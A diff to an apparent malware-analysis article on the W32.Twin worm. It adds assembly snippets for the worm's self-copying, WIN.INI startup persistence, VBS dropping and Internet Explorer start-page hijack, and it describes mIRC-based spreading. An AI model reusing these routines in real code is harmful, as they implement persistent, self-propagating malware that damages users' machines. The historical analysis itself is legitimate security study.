@@ -8,14 +8,10 @@ W32.Twin, authored by PetiK in December 2000, is a sophisticated worm written in
 
 The worm's emergence coincided with the rise of online communities and file-sharing, exploiting vulnerabilities in popular software to spread. Analyzing its source code reveals advanced techniques for the era, including registry manipulation, file creation, and script injection, which influenced subsequent malware designs. Understanding W32.Twin is vital for appreciating the evolution of worms from simple replicators to multi-vector threats. This dissection not only highlights historical tactics but also underscores the need for layered defenses against polymorphic and persistent malware in today's interconnected world.
 
-(Word count: 148)
-
 ## Section 1: Overview of the Malware 🐛
 W32.Twin is a worm designed to infect Windows systems, propagate through IRC channels, and alter browser behavior to download further payloads. Its primary purpose is to establish a foothold on infected machines, modify system settings for persistence, and spread via peer-to-peer interactions in chat environments. The malware behaves by copying itself to the Windows directory, creating auxiliary files (BAT, VBS, HTM), and injecting scripts into mIRC to send infected files to other users upon joining channels.
 
 Typical targets are Windows users running mIRC or Internet Explorer, prevalent in the early 2000s for online communication and browsing. Infection vectors include direct execution of the worm binary or via shared files in IRC. W32.Twin was part of a series of worms by the same author, contributing to the "worm wars" of the late 1990s and early 2000s. Campaigns often leveraged social engineering, such as posing as an IE plugin, to trick users into downloading. While not as widespread as mass-mailers, it caused disruptions through unwanted downloads, system modifications, and potential secondary infections from the plugin it fetches.
-
-(Word count: 162)
 
 ## Section 2: Source Code Analysis 🔬
 W32.Twin is coded in x86 assembly using TASM (Turbo Assembler), targeting the flat memory model with stdcall conventions. It relies on Windows API functions from KERNEL32, USER32, and ADVAPI32 for file operations, registry access, and process management. The full source code is provided below, followed by a detailed breakdown of its components, including examples of key functions.
@@ -312,13 +308,88 @@ end DEBUT
 ### Breakdown of Key Components
 The worm starts at the `DEBUT` label, checking for a registry key "Software\[PetiK]" in HKLM to avoid reinfection. If not present, it proceeds to copy itself.
 
-**Self-Copying (WCOPIE):** Uses `GetModuleFileNameA` to get its path, `GetWindowsDirectoryA` for the Windows folder, and `CopyFileA` to copy as "NAV5.exe". Example: `push offset szOrig; push offset szCopie; call CopyFileA` ensures the binary persists in a system location.
+**Self-Copying (WCOPIE):** Uses `GetModuleFileNameA` to get its path, `GetWindowsDirectoryA` for the Windows folder, and `CopyFileA` to copy as "NAV5.exe". 
+```
+push 0
+call GetModuleHandleA
+push 260
+push offset szOrig
+push eax
+call GetModuleFileNameA
+push 260
+push offset szCopie
+call GetWindowsDirectoryA
+push offset Copie
+push offset szCopie
+call lstrcat
+push 0
+push offset szCopie
+push offset szOrig
+call CopyFileA
+```
+This sequence retrieves the current module's path, builds the destination path in Windows directory, and copies the file for persistence.
 
-**Persistence via WIN.INI (WIN_INI):** Modifies WIN.INI to run the copied file on startup, avoiding obvious registry entries. Example: `call WritePrivateProfileStringA` with "run" under "[windows]" section adds the path, leveraging legacy auto-run mechanisms.
+**Persistence via WIN.INI (WIN_INI):** Modifies WIN.INI to run the copied file on startup, avoiding obvious registry entries. 
+```
+push 260
+push offset szWin
+call GetWindowsDirectoryA
+push offset Winini
+push offset szWin
+call lstrcat
+push offset szWin
+push offset szCopie
+push offset run
+push offset windows
+call WritePrivateProfileStringA
+```
+Example: `call WritePrivateProfileStringA` with "run" under "[windows]" section adds the path, leveraging legacy auto-run mechanisms.
 
-**File Creation (BAT, VBS, HTM):** Creates a BAT file to launch the VBS, a VBS script for runtime actions, and an HTM page for downloading. For VBS, it writes embedded data (`vbsd`) using `CreateFileA` and `WriteFile`. Example: `push vbstaille; push offset vbsd; push [fh]; call WriteFile` drops the script that manipulates IE and mIRC.
+**File Creation (BAT, VBS, HTM):** Creates a BAT file to launch the VBS, a VBS script for runtime actions, and an HTM page for downloading. For VBS, it writes embedded data (`vbsd`) using `CreateFileA` and `WriteFile`. 
+```
+push 00000000h
+push 00000080h
+push 00000002h
+push 00000000h
+push 00000001h
+push 40000000h
+push offset szVBS
+call CreateFileA
+mov [fh],eax
+push 00h
+push offset octets
+push vbstaille
+push offset vbsd
+push [fh]
+call WriteFile
+push [fh]
+call CloseHandle
+```
+This creates the VBS file in the system directory and writes the embedded script data to it, enabling runtime execution of malicious actions.
 
-**Registry Manipulation (BDR):** Sets IE's start page to the VBS file, triggering execution on browser launch. Example: `call RegSetValueExA` with `offset szVBS` under "Start Page" ensures the script runs when IE opens.
+**Registry Manipulation (BDR):** Sets IE's start page to the VBS file, triggering execution on browser launch. 
+```
+push offset l
+push offset p
+push 0
+push 1F0000h + 1 + 2h
+push 0
+push 0
+push 0
+push offset CLE2
+push 80000001h
+call RegCreateKeyExA
+push 05h
+push offset szVBS
+push 01h
+push 0
+push offset NOM2
+push p
+call RegSetValueExA
+push 0
+call RegCloseKey
+```
+Example: `call RegSetValueExA` with `offset szVBS` under "Start Page" ensures the script runs when IE opens.
 
 **Embedded Scripts:** The VBS changes download directory to C:\, checks for "PlugIE55.exe", alters start page to a malicious URL, and infects mIRC by overwriting script.ini to DCC-send the worm on joins. The HTM is a countdown page redirecting to download the plugin. Example: In VBS, `ws.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Download Directory","C:\"` forces downloads to root, facilitating payload placement.
 
